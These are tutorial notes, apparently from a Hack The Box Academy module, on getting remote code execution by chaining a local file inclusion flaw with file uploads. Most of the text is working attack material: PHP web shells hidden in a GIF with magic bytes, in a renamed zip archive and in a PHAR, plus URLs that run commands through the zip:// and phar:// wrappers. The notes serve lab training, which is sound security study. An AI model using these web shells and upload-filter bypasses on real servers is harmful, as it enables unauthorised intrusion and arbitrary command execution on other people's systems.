# LFI and File Uploads - [LINK](https://academy.hackthebox.com/app/module/23/section/1493)


If a web application has an LFI vulnerability and allows file uploads (even if the upload feature is highly secure and only allows images), you can achieve Remote Code Execution (RCE). This works because the inclusion function (like PHP's `include()`) executes whatever code is inside the file, completely ignoring the file extension.

## 1. Malicious Image Upload (The Most Reliable Method)

This method tricks the file upload filter by making the payload look like a valid image (e.g., a GIF) while containing PHP code.

**Step 1: Craft the Malicious Image**

* Create a file with an allowed extension (e.g., `.gif`).
* Add the image "Magic Bytes" (file signature) at the beginning of the file to bypass content-type/signature checks. For GIFs, the magic bytes are `GIF8`.
* **Command:**
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

```


**Step 2: Upload and Locate**

* Upload `shell.gif` to the server via the normal upload form (e.g., a profile picture upload).
* Inspect the web page source or copy the image link to find the upload directory (e.g., `/profile_images/shell.gif`).

**Step 3: Execute via LFI**

* Pass the path to your uploaded image into the LFI parameter and execute your command.
* **URL/Payload:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

```


*(Note: Use directory traversal `../` if the LFI parameter prepends a directory).*

## 2. Zip Wrapper Upload (Alternative Method)

If the server allows uploading `.zip` files (or if the upload filter can be bypassed by renaming a `.zip` to `.jpg`), you can use the `zip://` PHP wrapper to execute a script inside the archive.

**Step 1: Create and Zip the Web Shell**

* Create a PHP shell and compress it. Rename the resulting zip to an allowed extension if necessary.
* **Command:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```



**Step 2: Upload the Archive**

* Upload `shell.jpg` to the server.

**Step 3: Execute via Zip Wrapper**

* Use `zip://` followed by the path to the uploaded file.
* Append `#` (URL encoded as `%23`) followed by the name of the file *inside* the zip (`shell.php`).
* **URL/Payload:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

```

## 3. Phar Wrapper Upload (Alternative Method)

Similar to the Zip method, the `phar://` wrapper can read and execute files bundled inside a PHP Archive (PHAR).

**Step 1: Create a Phar Generation Script**

* Create a file named `shell.php` on your local machine with the following content:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();

```



**Step 2: Compile the Phar File**

* Execute the script to generate `shell.phar`, then rename it to an allowed extension.
* **Command:**
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

```



**Step 3: Upload and Execute via Phar Wrapper**

* Upload `shell.jpg` to the server.
* Use `phar://` followed by the path to the file.
* Append `/` (URL encoded as `%2F`) followed by the internal filename (`shell.txt`).
* **URL/Payload:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

```
